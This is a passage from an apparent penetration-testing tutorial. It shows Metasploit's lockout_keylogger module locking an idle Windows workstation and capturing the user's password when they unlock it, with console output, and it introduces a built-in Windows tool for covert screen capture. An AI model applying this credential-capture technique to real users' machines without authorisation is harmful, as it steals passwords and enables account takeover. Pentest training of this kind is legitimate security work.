    Lockout_Keylogger automatically finds the Winlogon process and migrates to it.
    The program then begins to monitor the remote system idle time. At about 300 seconds
    of idle time, Lockout Keylogger tries to lock the user''s desktop remotely. Sometimes
    it fails and tries locking it again:


    ```

    [*] Current Idle time: 262 seconds

    [*] Current Idle time: 293 seconds

    [-] Locking the workstation failed, trying again...

    [*] Locked this time, time to start keyloggin...

    [*] Starting the keystroke sniffer....

    [*] Keystrokes being saved in to /root/.msf4/logs/scripts/smartlocker/192.168.1.95

    [*] Recording

    [*] System has currently been idle for 327 seconds and the screensaver is OFF

    ```


    Okay, lockout has successfully locked the workstation, and begins looking for
    keystrokes. If our user returns and enters his password to unlock the system,
    we get it:


    ```

    [*] Password?: password <Return>

    [*] They logged back in, the last password was probably right.

    [*] Stopping keystroke sniffer...

    [*] Post module execution completed

    msf post(lockout_keylogger) >

    ```


    The target user unlocked the workstation and entered their password, "*password*",
    which we were able to then view in Metasploit. Though I have noticed in the past
    that with longer passwords it seems that some of the characters were cut off on
    the recovered password, and sometimes I just got garbage characters. Not sure
    if that is a password length buffer limit in the program or something else. But
    for a program that was written a few years ago, it still seems to work pretty
    well.


    Next, I want to look at using a built in Microsoft tool that is in every version
    of Windows since 7 as a remote screengrab and user activity logging tool. Though
    it is not a key scanner, it could be used during a pentest to obtain some interesting
    information that could also be very convincing in an after-action report.'
